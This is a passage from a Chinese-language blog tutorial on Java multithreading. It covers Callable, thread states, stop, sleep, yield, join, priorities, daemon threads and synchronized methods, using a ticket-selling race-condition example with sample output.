executorService.submit(call1);</span><br><span class="line">        Future&lt;Boolean&gt; submit1 = executorService.submit(call2);</span><br><span class="line">        Future&lt;Boolean&gt; submit2 = executorService.submit(call3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//       获取执行结果</span></span><br><span class="line">        Boolean aBoolean = submit.get();</span><br><span class="line">        Boolean aBoolean1 = submit1.get();</span><br><span class="line">        Boolean aBoolean2 = submit2.get();</span><br><span class="line">        System.out.println(aBoolean);</span><br><span class="line">        System.out.println(aBoolean1);</span><br><span class="line">        System.out.println(aBoolean2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭服务</span></span><br><span class="line">        executorService.shutdown();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebDownloadsCallable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">downLoads</span><span class="params">(String url, String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyURLToFile(<span class="keyword">new</span> URL(url), <span class="keyword">new</span> File(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以自定义返回值</li><li>可以抛出异常</li></ul><h1 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h1><h2 id="线程的5大状态"><a href="#线程的5大状态" class="headerlink" title="线程的5大状态"></a>线程的5大状态</h2><p>​    创建状态、就绪状态、阻塞状态、运行状态、死亡状态</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291653466.png"></p><h2 id="创建状态"><a href="#创建状态" class="headerlink" title="创建状态"></a>创建状态</h2><p><code>Thread t = new Thread()</code></p><p>线程对象一旦创建就进入到了新生状态</p><h2 id="就绪状态"><a href="#就绪状态" class="headerlink" title="就绪状态"></a>就绪状态</h2><p>当调用start()方法，线程立即进入就绪状态，但不意味着立即调度执行。</p><h2 id="阻塞状态"><a href="#阻塞状态" class="headerlink" title="阻塞状态"></a>阻塞状态</h2><p>当调用sleep，wait或同步锁定时，线程进入阻塞状态，就是代码不往下执行，阻塞事件解除后，重新进入就绪状态，等待cpu调度执行。</p><h2 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h2><p>进入运行状态，线程才真正执行线程体的代码块。</p><h2 id="死亡状态"><a href="#死亡状态" class="headerlink" title="死亡状态"></a>死亡状态</h2><p>线程中断或者结束，一旦进入死亡状态就不能再次启动。</p><h2 id="观测状态"><a href="#观测状态" class="headerlink" title="观测状态"></a>观测状态</h2><p><code>sThread.State</code></p><ul><li>NEW<ul><li>尚未启动的线程处于此状态</li></ul></li><li>RUNNABLE<ul><li>在Java虚拟机中执行的线程处于此状态</li></ul></li><li>BLOCKED<ul><li>被阻塞等待监视器锁定的线程处于此状态中</li></ul></li><li>WAITING<ul><li>正在等待另一个线程执行特定动作的线程处于此状态</li></ul></li><li>TIMED_WAITING<ul><li>正在等待另一个线程执行动作达到指定等待时间的线程处于瓷砖太</li></ul></li><li>TERMINATED<ul><li>已退出的线程处于此状态</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThreadState</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Thread.State state;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread( ()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;run Thread&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; );</span><br><span class="line">        state = thread.getState();</span><br><span class="line">        System.out.println(state);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        state = thread.getState();</span><br><span class="line">        System.out.println(state);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (state != Thread.State.TERMINATED)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程未停止&quot;</span>);</span><br><span class="line">            state = thread.getState();</span><br><span class="line">            System.out.println(state);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程的方法"><a href="#线程的方法" class="headerlink" title="线程的方法"></a>线程的方法</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201291701741.png"></p><h2 id="线程的停止方法"><a href="#线程的停止方法" class="headerlink" title="线程的停止方法"></a>线程的停止方法</h2><p>不推荐使用JDK提供的stop()、destroy()方法。</p><p>推荐线程自己停止下来</p><p>建议使用一个标志位进行终止变量<code>当flag=false，则终止线程运行。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStop</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Thread is Running&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            TestStop stops = <span class="keyword">new</span> TestStop();</span><br><span class="line">            <span class="keyword">new</span> Thread(stops).start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">1500</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Thread is &quot;</span>+i);</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">1500</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Thread is stop&quot;</span>);</span><br><span class="line">                stops.stop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h2><p>sleep(时间)指当前前线阻塞的毫秒数</p><p>sleep存在异常InterruptedException;</p><p>sleep时间达到后线程进入就绪状态</p><p>sleep可以模拟网络延时、倒计时等</p><p>每一个对象都有一个锁，sleep不会释放锁</p><h2 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h2><p>礼让线程，让当前正在执行的线程暂停，但不阻塞</p><p>将线程从未运行状态转为就绪状态</p><p><code>让CPU重新调度，礼让不一定成功！</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestYield</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyYield(), <span class="string">&quot;第一&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyYield(), <span class="string">&quot;第二&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyYield</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---我是开始&quot;</span>);</span><br><span class="line">        Thread.yield(); <span class="comment">//礼让</span></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---我是停止&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="合并线程"><a href="#合并线程" class="headerlink" title="合并线程"></a>合并线程</h2><p>Join合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞。</p><p>可以想象成插队</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJoin</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我是VIP&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        TestJoin testJoin = <span class="keyword">new</span> TestJoin();</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(testJoin);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">900</span>)&#123;</span><br><span class="line">                thread.start();</span><br><span class="line">                thread.join();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;main方法&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h1><p>Java提供一个线程调度器来 监视程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行。<code>并不意味着优先级高的一定先执行</code></p><p>线程的优先级用数字表示范围1~10</p><ol><li>Thread.MIN_PRIORITY = 1;</li><li>Thread.MAX_PRIORITY = 10;</li><li>Thread.NORM_PRIORITY = 5;</li></ol><p>使用以下方法改变或获取优先级</p><p>​    <code>getPriority().setPriority(int xxx)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TheadPriority</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--&gt;&quot;</span>+Thread.currentThread().getPriority());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> TheadPriority(), <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> TheadPriority(), <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> TheadPriority(), <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置优先级</span></span><br><span class="line">        thread.setPriority(<span class="number">3</span>);</span><br><span class="line">        thread1.setPriority(<span class="number">1</span>);</span><br><span class="line">        thread2.setPriority(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--&gt;&quot;</span>+Thread.currentThread().getPriority());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h1><p>线程分为用户线程和守护线程</p><p>虚拟机必须确保用户线程执行完毕</p><p>虚拟机不用等待守护线程执行完毕</p><p>如，后台记录操作日志、监控内存、垃圾回收等待….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DaemonTest</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread( ()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3650</span>; i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我还在&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;我不在了&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; );</span><br><span class="line"></span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread( ()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我是守护线程&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread1.setDaemon(<span class="keyword">true</span>);    <span class="comment">// 设置守护线程</span></span><br><span class="line">        thread.start();</span><br><span class="line">        thread1.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><p>多个线程操作同一个资源</p><p><code>并发</code>：同一个对象被多个线程同时操作<br>处理多线程问题时，多个线程访问同一个对象并且某些线程还想修改这个对象，我们就需要线程同步，线程同步其实就是一种<code>等待机制</code>，多个需要同时访问此对象的线程进入这个对象的等待池形成队列，等待前面线程使用完毕，下一个线程再使用。</p><hr><p>由于同一进程的多个线程共享同一块存储空间，在带来方便的同时，也带来访问冲突问题，为了保证数据再方法中被访问时的正确性，在访问时加入锁机制<code>synchronized</code>，当一个线程获得对象的排它锁，独占资源。其他线程必须等待，使用后释放锁即可，但是存在以下问题。</p><ol><li>一个线程持有锁会导致其他所有需要此锁的线程挂起</li><li>在多线程竞争下，加锁，释放锁会导致比较多的上下文切换和调度延时，引起性能问题。</li><li>如果一个优先级高的线程等待一个优先级低的线程释放锁，会导致优先级倒置，引起性能问题。</li></ol><h2 id="不安全同步示例"><a href="#不安全同步示例" class="headerlink" title="不安全同步示例"></a>不安全同步示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 线程不安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BuyTicket buyTicket = <span class="keyword">new</span> BuyTicket();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第一个人&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第二个人&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第三个人&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyTicket</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">            butTicket();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">butTicket</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ticket &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---&gt;&quot;</span>+ticket--);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出示例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">第二个人---&gt;<span class="number">10</span></span><br><span class="line">第一个人---&gt;<span class="number">9</span></span><br><span class="line">第三个人---&gt;<span class="number">9</span></span><br><span class="line">第二个人---&gt;<span class="number">8</span></span><br><span class="line">第一个人---&gt;<span class="number">8</span></span><br><span class="line">第三个人---&gt;<span class="number">7</span></span><br><span class="line">第一个人---&gt;<span class="number">5</span></span><br><span class="line">第三个人---&gt;<span class="number">4</span></span><br><span class="line">第二个人---&gt;<span class="number">6</span></span><br><span class="line">第三个人---&gt;<span class="number">3</span></span><br><span class="line">第二个人---&gt;<span class="number">3</span></span><br><span class="line">第一个人---&gt;<span class="number">3</span></span><br><span class="line">第一个人---&gt;<span class="number">2</span></span><br><span class="line">第二个人---&gt;<span class="number">2</span></span><br><span class="line">第三个人---&gt;<span class="number">2</span></span><br><span class="line">第三个人---&gt;<span class="number">1</span></span><br><span class="line">第一个人---&gt;<span class="number">1</span></span><br><span class="line">第二个人---&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h2><p>由于我们可以通过private关键字来保证数据对像只能被方法访问，所以我们只需针对方法提出一套机制，这套机制就是<code>synchronized</code>关键字，它包括两种用法，synchronized方法和synchronized块。</p><p><code>同步方法: public synchronized void method(int ages)&#123;&#125;</code></p><p>synchronized方法控制对”对象”的访问，每个对象对应着一把锁，每个synchronized方法都必须获得调用该方法的对象锁才能执行，否者线程会阻塞，方法一旦执行，就独占该锁，直到该方法返回才释放锁，后面被阻塞的线程才能获得这个锁，继续执行。</p><p><code>缺陷:若将一个很大的方法声明synchronized将会影响效率</code></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201301139209.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 线程安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BuyTicket buyTicket = <span class="keyword">new</span> BuyTicket();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第一个人&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第二个人&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(buyTicket, <span class="string">&quot;第三个人&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyTicket</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">            butTicket();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">500</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">butTicket</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ticket &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---&gt;&quot;</span>+ticket--);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="同步块"><a href="#同步块" class="headerlink" 